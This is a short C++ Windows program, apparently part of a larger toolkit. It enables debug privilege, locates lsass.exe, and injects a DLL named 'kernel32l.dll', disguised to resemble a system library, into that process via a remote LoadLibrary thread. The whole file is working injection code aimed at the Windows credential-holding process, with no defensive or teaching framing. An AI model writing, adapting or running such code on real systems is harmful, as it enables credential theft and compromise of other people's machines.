// Inject.cpp : 定义应用程序的入口点。
//

#include "stdafx.h"
#include "Inject.h"
#include <time.h>
#include "../../../publicstruct.h"
#include "../../../ProcessManger/ProcessIterator/CProcessOpt.h"
#include "../../../ThreadManger/RemoteThread/CRemoteThread.h"
#include <vector>
using namespace std;
vector<CBinString> g_Process;


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    
    CProcessOpt Psopt;
    Psopt.SeEnbalAdjustPrivileges(SE_DEBUG_NAME);

    CRemoteThread Thread;
    g_Process.push_back(TEXT("lsass.exe"));
   
   
    srand((unsigned long) time(0));
    TCHAR szPath[MAX_PATH] = { 0 };
    GetCurrentDirectory(MAX_PATH * sizeof(TCHAR), szPath);
    ::lstrcat(szPath, TEXT("\\"));

    CBinString strPatn = szPath;
    strPatn += TEXT("kernel32l.dll");
    HANDLE hProcess = 0;
    DWORD dwPid = 9;
 
        dwPid =   Psopt.PsGetProcessIdByProcessFileName(g_Process[0]);
        char szbuff[0x100] = { 0 };
        sprintf(szbuff, "dwpid = %d \r\n", dwPid);
        OutputDebugStringA(szbuff);
        hProcess = Psopt.PsGetProcess(dwPid);
        if (hProcess == 0)
        {
            OutputDebugStringA("hprocess = NULL");
            return 0;
        }
        //成功.打开进程进行注入.
        if (TRUE == Thread.RtsRemoteThreadLoadLibrary(hProcess, NULL, strPatn.c_str()))
        {
            //CloseHandle(hProcess);
            OutputDebugStringA("Inject Ok");
            return 0;
       }
  
    //从数组中随机抽取.
}



